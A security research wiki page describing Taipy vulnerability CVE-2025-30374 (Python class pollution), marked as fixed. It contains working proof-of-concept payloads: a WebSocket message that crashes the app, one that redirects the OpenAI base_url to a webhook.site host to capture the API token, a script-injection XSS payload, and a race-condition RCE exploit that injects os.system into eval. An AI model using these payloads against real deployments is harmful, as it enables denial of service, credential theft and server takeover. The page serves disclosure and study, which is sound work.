@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Taipy | Python Class Pollution</title>
+    <link rel="stylesheet" href="/wiki/css/wiki.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</head>
+<body>
+    <div class="wiki-layout">
+        <nav class="sidebar">
+            <div class="sidebar-header">
+                <a href="/wiki/docs/">Class Pollution Wiki</a>
+            </div>
+            <ul class="sidebar-nav">
+
+
+    <li>
+        <a href="/wiki/docs/" >Overview</a>
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/taxonomy/" >Taxonomy</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/taxonomy/atomics/" >Get &amp; Set Atomics</a></li>
+            
+            <li><a href="/wiki/docs/taxonomy/primitives/" >Pollution Primitives</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/targets/" >Pollution Targets</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/targets/classes/" >Classes</a></li>
+            
+            <li><a href="/wiki/docs/targets/modules/" >Modules</a></li>
+            
+            <li><a href="/wiki/docs/targets/functions/" >Functions</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/gadgets/" >Gadgets</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/gadgets/rce/" >RCE Gadgets</a></li>
+            
+            <li><a href="/wiki/docs/gadgets/xss/" >XSS Gadgets</a></li>
+            
+            <li><a href="/wiki/docs/gadgets/auth-bypass/" >Auth Bypass Gadgets</a></li>
+            
+            <li><a href="/wiki/docs/gadgets/dos/" >DoS Gadgets</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/tool/" >Tool</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/tool/pyrl/" >Pyrl</a></li>
+            
+            <li><a href="/wiki/docs/tool/polluter/" >Polluter</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/collection/" >Showcases &amp; CVEs</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/collection/catalog/" >Catalog</a></li>
+            
+            <li><a href="/wiki/docs/collection/showcases/" >Showcase Walkthroughs</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/defense/" >Defense</a>
+        
+    </li>
+    
+
+</ul>
+
+        </nav>
+        <main class="content">
+            
+<article>
+    <h1 id="taipy-cve-2025-30374">Taipy (CVE-2025-30374)</h1>
+<p><strong>Taipy</strong> is a popular Python framework for building data applications (19.2K stars), widely used in ML/AI workflows.</p>
+<table>
+  <thead>
+      <tr>
+          <th>Field</th>
+          <th>Value</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Repository</td>
+          <td><a href="https://github.com/Avaiga/taipy">Avaiga/taipy</a></td>
+      </tr>
+      <tr>
+          <td>Version</td>
+          <td>v4.0.3</td>
+      </tr>
+      <tr>
+          <td>CVE</td>
+          <td>CVE-2025-30374</td>
+      </tr>
+      <tr>
+          <td>Type</td>
+          <td>Constrained-Get × Attr-Set</td>
+      </tr>
+      <tr>
+          <td>Input</td>
+          <td>Remote</td>
+      </tr>
+      <tr>
+          <td>Consequnces</td>
+          <td>RCE, DoS, Stored XSS, Token Exfiltration</td>
+      </tr>
+      <tr>
+          <td>Status</td>
+          <td>Fixed</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="summary">Summary</h2>
+<p>We identified a class pollution vulnerability in Taipy that allows attackers to overwrite the Taipy runtime context, leading to severe consequences including RCE, Reflected XSS, Denial of Service (DoS), and leakage of sensitive authorization credentials (e.g., OpenAI tokens).</p>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>The root cause lies in Taipy&rsquo;s use of a recursive set function to update variable values in Taipy states. Both the <code>name</code> and <code>value</code> parameters are derived from client-side input and lack proper validation. This allows an attacker to inject malicious input, such as <code>_TpN_tpec_TpExPr_value_TPMDL_2.__class__.__base__.set</code>, to overwrite the <code>set</code> method of <code>_TaipyBase</code>.</p>
+<p>The following functions are invoked in multiple routes via <code>_manage_message</code> to update states from the client side:</p>
+<p><a href="https://github.com/Avaiga/taipy/blob/5c56f125a2bab02a260eee88503ee480ac933f7e/taipy/gui/utils/_attributes.py#L37-L42"><code>taipy/gui/utils/_attributes.py</code></a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_attrsetter</span>(obj: object, attr_str: str, value: object) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    var_name_split <span style="color:#f92672">=</span> attr_str<span style="color:#f92672">.</span>split(sep<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;.&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(var_name_split) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>        sub_name <span style="color:#f92672">=</span> var_name_split[i]
+</span></span><span style="display:flex;"><span>        obj <span style="color:#f92672">=</span> getattr(obj, sub_name)        <span style="color:#75715e"># Constrained: getattr only</span>
+</span></span><span style="display:flex;"><span>    setattr(obj, var_name_split[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>], value)  <span style="color:#75715e"># Attr-Set only</span>
+</span></span></code></pre></div><p><a href="https://github.com/Avaiga/taipy/blob/5c56f125a2bab02a260eee88503ee480ac933f7e/taipy/gui/utils/_attributes.py#L53-L58"><code>taipy/gui/utils/_attributes.py</code></a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_setscopeattr_drill</span>(obj: object, attr_str: str, value: object) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>    var_name_split <span style="color:#f92672">=</span> attr_str<span style="color:#f92672">.</span>split(sep<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;.&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(var_name_split) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>        sub_name <span style="color:#f92672">=</span> var_name_split[i]
+</span></span><span style="display:flex;"><span>        obj <span style="color:#f92672">=</span> getattr(obj, sub_name)
+</span></span><span style="display:flex;"><span>    setattr(obj, var_name_split[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>], value)
+</span></span></code></pre></div><p>The functions:</p>
+<ol>
+<li>Split the attacker-controlled <code>attr_str</code> by dots</li>
+<li>Resolve each segment via <code>getattr</code> (Constrained-Get)</li>
+<li>Set the final attribute with <code>setattr</code> (Attr-Set)</li>
+</ol>
+<p>No validation is performed on the attribute path.</p>
+<h2 id="poc">PoC</h2>
+<h3 id="consequence-1-dos">Consequence 1: DoS</h3>
+<p><a href="https://drive.google.com/file/d/1BESvtyaJyEOp0BkeFdZFdwj83_E9wp18/view">Video PoC</a></p>
+<p><strong>Steps:</strong></p>
+<ol>
+<li>Set up the tutorial case from the <a href="https://docs.taipy.io/en/latest/tutorials/getting_started/">Taipy Getting Started Guide</a> at <code>http://localhost:5000</code>.</li>
+<li>Visit the page, intercept the WebSocket request, and replace the <code>name</code> field with <code>_TpN_tpec_TpExPr_value_TPMDL_2.__class__.__base__.set</code>. This overwrites the <code>set</code> method of <code>_TaipyBase</code> with a non-callable integer.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;message&#34;</span>,{<span style="color:#f92672">&#34;type&#34;</span>:<span style="color:#e6db74">&#34;U&#34;</span>,<span style="color:#f92672">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;_TpN_tpec_TpExPr_value_TPMDL_2.__class__.__base__.set&#34;</span>,<span style="color:#f92672">&#34;payload&#34;</span>:{<span style="color:#f92672">&#34;value&#34;</span>:<span style="color:#ae81ff">71</span>,<span style="color:#f92672">&#34;on_change&#34;</span>:<span style="color:#e6db74">&#34;slider_moved&#34;</span>},<span style="color:#f92672">&#34;propagate&#34;</span>:<span style="color:#66d9ef">true</span>,<span style="color:#f92672">&#34;client_id&#34;</span>:<span style="color:#e6db74">&#34;20250313210404484031-0.3099351422929606&#34;</span>,<span style="color:#f92672">&#34;ack_id&#34;</span>:<span style="color:#e6db74">&#34;Li_DKilnNL_N2AILnmFsD&#34;</span>,<span style="color:#f92672">&#34;module_context&#34;</span>:<span style="color:#e6db74">&#34;__main__&#34;</span>},<span style="color:#66d9ef">null</span>]
+</span></span></code></pre></div><ol start="3">
+<li>Refresh the page and observe that dragging the slider causes the application to crash.</li>
+</ol>
+<p><strong>Effect</strong>: <code>_TaipyBase.set</code> is overwritten with a non-callable integer. Any subsequent state update operation raises <code>TypeError</code>, making the application completely unusable for all users.</p>
+<hr>
+<h3 id="consequence-2-openai-token-leakage">Consequence 2: OpenAI Token Leakage</h3>
+<p><a href="https://drive.google.com/file/d/1uXiHpO-SzE1jhHzMRCTZo9CSOZHORTmT/view">Video PoC</a></p>
+<p><strong>Steps:</strong></p>
+<ol>
+<li>Set up the LLM ChatBot example from the <a href="https://docs.taipy.io/en/latest/tutorials/articles/chatbot/">Taipy ChatBot Tutorial</a> at <code>http://localhost:5000</code>. The source code can be found <a href="https://github.com/Avaiga/demo-chatbot">here</a>.</li>
+<li>Visit the page, send a message (e.g., &ldquo;hello&rdquo;), and intercept the WebSocket request. Replace the <code>name</code> field with <code>client.base_url</code> and the <code>value</code> field with an attacker-controlled domain. This step may require multiple attempts to succeed.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;message&#34;</span>,{<span style="color:#f92672">&#34;type&#34;</span>:<span style="color:#e6db74">&#34;U&#34;</span>,<span style="color:#f92672">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;client.base_url&#34;</span>,<span style="color:#f92672">&#34;payload&#34;</span>:{<span style="color:#f92672">&#34;value&#34;</span>:<span style="color:#e6db74">&#34;https://webhook.site/0df4ac02-0b20-4ffc-bbda-287da8bc8a0a&#34;</span>},<span style="color:#f92672">&#34;propagate&#34;</span>:<span style="color:#66d9ef">true</span>,<span style="color:#f92672">&#34;client_id&#34;</span>:<span style="color:#e6db74">&#34;20250315152148416630-0.5672333200699874&#34;</span>,<span style="color:#f92672">&#34;ack_id&#34;</span>:<span style="color:#e6db74">&#34;8OBXzCgeNv_DDW4MGpgnW&#34;</span>,<span style="color:#f92672">&#34;module_context&#34;</span>:<span style="color:#e6db74">&#34;__main__&#34;</span>},<span style="color:#66d9ef">null</span>]
+</span></span></code></pre></div><ol start="3">
+<li>Send additional messages and observe that requests intended for OpenAI are redirected to the attacker&rsquo;s server, along with the associated OpenAI token.</li>
+</ol>
+<p><strong>Effect</strong>: The attacker-controlled <code>base_url</code> causes all subsequent API calls (including the <code>Authorization: Bearer &lt;token&gt;</code> header) to be sent to the attacker&rsquo;s server, leaking the OpenAI API key.</p>
+<hr>
+<h3 id="consequence-3-xss">Consequence 3: XSS</h3>
+<img src="/wiki/img/taipy-xss.gif" alt="Taipy XSS via class pollution" width="100%">
+<p>In <a href="https://github.com/Avaiga/taipy/blob/439c7f52253fc09dd41c455a8a9f8da962d49dfa/taipy/gui/gui.py#L542-L546"><code>taipy/gui/gui.py</code></a>, when the application attempts to render user content, if the content provider is not found, it falls back to returning <code>type(content).__name__</code> as the HTML response:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_user_content_url</span>(self, <span style="color:#f92672">...</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> provider <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> type(content)<span style="color:#f92672">.</span>__name__
+</span></span></code></pre></div><p>However, the <code>__name__</code> attribute of a class object is settable through class pollution, e.g., <code>tp_TpExPr_gui_get_adapted_lov_past_conversations_NoneType_TPMDL_2_0.__class__.__name__</code>. An attacker can overwrite this attribute with a malicious HTML or JavaScript payload.</p>
+<p><strong>Exploit:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pollute(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;tp_TpExPr_gui_get_adapted_lov_past_conversations_NoneType_TPMDL_2_0.__class__.__name__&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&lt;script&gt;alert(document.domain)&lt;/script&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span></code></pre></div><p><strong>Effect</strong>: The attacker&rsquo;s script is injected into pages served to users who trigger the content rendering path.</p>
+<hr>
+<h3 id="consequence-4-rce">Consequence 4: RCE</h3>
+<img src="/wiki/img/taipy-rce.gif" alt="Taipy RCE via class pollution" width="100%">
+<p>The class pollution vulnerability allows attackers to set arbitrary attributes on objects that appear in the session state. We found that the <code>Gui.on_action</code> route can be leveraged to invoke the <code>Gui.table_on_edit</code> method, which allows new objects from the <code>__main__</code> module to be bound into the session state. In <a href="https://github.com/Avaiga/taipy/blob/439c7f52253fc09dd41c455a8a9f8da962d49dfa/taipy/gui/gui.py#L1872"><code>taipy/gui/gui.py</code></a>, a <code>getattr</code> call on the state object automatically triggers the binding operation, while a subsequent <code>setattr</code> immediately resets the bound value to <code>None</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>setattr(state, var_name, <span style="color:#66d9ef">None</span>)  <span style="color:#75715e"># briefly binds the object before resetting</span>
+</span></span></code></pre></div><p>This behavior creates a brief race window where object references, such as the <code>Gui</code> class, temporarily exist in the session state. During this window, attackers can exploit class pollution to overwrite attributes on those objects.</p>
+<p>We further discovered that the <code>Gui.__SELF_VAR</code> attribute is used as a prefix when constructing expressions passed to Python&rsquo;s built-in <code>eval()</code> function in <a href="https://github.com/Avaiga/taipy/blob/439c7f52253fc09dd41c455a8a9f8da962d49dfa/taipy/gui/utils/_evaluator.py#L265"><code>taipy/gui/utils/_evaluator.py</code></a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>expr <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>__SELF_VAR<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">{</span>expression<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>eval(expr, <span style="color:#f92672">...</span>)
+</span></span></code></pre></div><p>By overwriting the <code>__SELF_VAR</code> value through class pollution, an attacker can control the expression that gets evaluated, ultimately leading to arbitrary code execution on the server.</p>
+<p><strong>Exploit (race condition):</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run_race</span>():
+</span></span><span style="display:flex;"><span>    num_pollute <span style="color:#f92672">=</span> <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>    barrier <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Barrier(num_pollute <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    threads <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(num_pollute):
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;__import__(&#39;os&#39;).system(&#39;touch /tmp/pwned&#39;)&#34;</span>
+</span></span><span style="display:flex;"><span>        t <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(
+</span></span><span style="display:flex;"><span>            target<span style="color:#f92672">=</span>pollute_race,
+</span></span><span style="display:flex;"><span>            args<span style="color:#f92672">=</span>(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Gui._Gui__SELF_VAR&#34;</span>, payload)
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>        threads<span style="color:#f92672">.</span>append(t)
+</span></span><span style="display:flex;"><span>        t<span style="color:#f92672">.</span>start()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    t_overwrite <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>overwrite_race, args<span style="color:#f92672">=</span>(<span style="color:#e6db74">&#34;Gui&#34;</span>,))
+</span></span><span style="display:flex;"><span>    threads<span style="color:#f92672">.</span>append(t_overwrite)
+</span></span><span style="display:flex;"><span>    t_overwrite<span style="color:#f92672">.</span>start()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    barrier<span style="color:#f92672">.</span>wait()
+</span></span></code></pre></div><p><strong>Effect</strong>: Arbitrary shell command execution as the Taipy server process user.</p>
+<h2 id="impact">Impact</h2>
+<p>Any user of Taipy can exploit this vulnerability to launch RCE, Reflected XSS, Denial of Service (DoS), and leakage of sensitive authorization credentials (e.g., OpenAI tokens). The WebSocket endpoint is accessible to any user, making this a remote-triggerable vulnerability. Taipy Enterprise promptly patched the issue after responsible disclosure.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p><a href="https://github.com/jackfromeast/python-class-pollution/tree/main/cp-collection/taipy/poc"><code>cp-collection/taipy/poc/</code></a>
+— runnable exploit environment with <code>run.sh</code> and <code>requirements.txt</code>.</p>
+<p>Full exploit scripts:</p>
+<ul>
+<li><a href="https://gist.github.com/jackfromeast/df377c20520c101ab61111b8f6da6583#file-rce-py">RCE exploit</a></li>
+<li><a href="https://gist.github.com/jackfromeast/df377c20520c101ab61111b8f6da6583#file-xss-py">XSS exploit</a></li>
+</ul>
+
+</article>
+
+        </main>
+    </div>
+</body>
+</html>
